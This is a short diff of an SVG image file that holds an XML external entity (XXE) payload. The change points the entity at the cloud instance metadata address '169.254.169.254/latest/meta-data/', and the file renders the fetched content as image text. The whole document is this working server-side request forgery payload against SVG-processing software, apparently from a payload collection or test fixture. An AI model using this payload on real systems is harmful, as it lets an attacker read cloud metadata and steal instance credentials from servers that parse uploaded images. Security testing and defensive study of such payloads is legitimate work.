@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254">
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <text x="0" y="20" font-size="15">&xxe;</text>
